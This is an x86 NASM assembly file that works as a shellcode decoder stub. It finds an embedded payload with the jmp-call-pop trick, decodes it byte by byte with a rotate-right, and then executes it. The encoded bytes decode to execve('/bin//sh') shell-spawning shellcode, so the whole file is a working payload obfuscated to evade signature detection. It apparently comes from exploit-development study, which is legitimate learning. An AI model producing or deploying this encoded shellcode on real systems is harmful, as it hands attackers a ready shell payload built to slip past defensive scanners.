; Filename: rotateRightDecoder.nasm
; Author:   boku

global _start

section .text
_start:
  jmp short call_decoder ; 1. jump to where the shellcode string is

decoder: 
  pop esi                ; 3. Put string location in esi register

decode:
  ror byte [esi], 1      ; 4. decode the byte by bitwise rotate right
  cmp byte [esi], 0xFF   ; 5. Is this the last byte?
  je Shellcode           ;    - If so jump into the payload and execute
  inc esi                ; 6. Not end? Move forward 1 byte
  jmp short decode       ; 7. Lets decode the next byte
        
call_decoder:
  call decoder           ; 2. Put the mem location of the string on the stack
  Shellcode: db 0x62,0x81,0xa0,0xd0,0x5e,0x5e,\
      0xe6,0xd0,0xd0,0x5e,0xc4,0xd2,0xdc,0x13,\
      0xc7,0xa0,0x13,0xc5,0xa6,0x13,0xc3,0x61,\
      0x16,0x9b,0x01,0xff
